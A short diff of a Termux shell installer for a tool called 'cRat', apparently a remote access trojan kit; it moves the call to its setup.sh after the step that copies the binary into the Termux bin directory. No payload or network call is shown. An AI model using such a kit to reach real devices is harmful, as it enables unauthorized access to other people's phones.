@@ -32,9 +32,6 @@ apt install nodejs
 sleep 1
 clear
 npm install
-sleep 1
-clear
-bash $HOME/cRat/Core/setup.sh
 clear
 sleep 1
 unzip $HOME/cRat/Core/app/factory/dimmy.zip
@@ -43,6 +40,8 @@ sleep 1
 cp $HOME/cRat/Core/cRat /data/data/com.termux/files/usr/bin
 clear
 sleep 1
+clear
+bash $HOME/cRat/Core/setup.sh
 echo -e "\e[31m JOB DONE 🙃 OPEN NEW SESSION AND TYPE \e[42m cRat\e[0m"
 echo;echo;
 bash start.sh 
